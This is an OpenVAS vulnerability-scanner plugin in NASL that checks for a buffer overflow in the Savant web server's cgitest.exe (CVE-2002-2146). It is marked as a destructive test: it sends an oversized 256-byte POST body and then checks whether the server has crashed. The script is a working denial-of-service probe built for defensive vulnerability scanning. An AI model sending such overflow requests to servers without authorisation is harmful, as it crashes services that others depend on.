###############################################################################
# OpenVAS Vulnerability Test
# $Id: savant_cgitest.nasl 7273 2017-09-26 11:17:25Z cfischer $
#
# Savant cgitest.exe buffer overflow
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

# References:
#
# Date: Fri, 13 Sep 2002 19:55:05 +0000
# From "Auriemma Luigi" <aluigi@pivx.com>
# To: bugtraq@securityfocus.com
# Subject: Savant 3.1 multiple vulnerabilities

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11173");
  script_version("$Revision: 7273 $");
  script_tag(name:"last_modification", value:"$Date: 2017-09-26 13:17:25 +0200 (Tue, 26 Sep 2017) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_cve_id("CVE-2002-2146");
  script_bugtraq_id(5706);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Savant cgitest.exe buffer overflow");
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_copyright("This script is Copyright (C) 2002 Michel Arboi");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  tag_summary = "cgitest.exe from Savant web server is installed. This CGI is
  vulnerable to a buffer overflow which may allow a cracker to
  crash your server or even run code on your system.";

  tag_solution = "Upgrade your web server or remove this CGI.";

  script_tag(name:"solution", value:tag_solution);
  script_tag(name:"summary", value:tag_summary);

  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );

host = http_host_name( port:port );

foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = dir + "/cgitest.exe";

  if( is_cgi_installed_ka( item:url, port:port ) ) {

    soc = http_open_socket( port );
    if( ! soc ) exit( 0 );

    len = 256; # 136 should be enough
    req = string( "POST ", url, " HTTP/1.0\r\n",
                  "Host: ", host,
                  "\r\nContent-Length: ", len,
                  "\r\n\r\n", crap( len ), "\r\n" );
    send( socket:soc, data:req );
    http_close_socket( soc );

    sleep( 1 );

    if( http_is_dead( port:port ) ) {
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
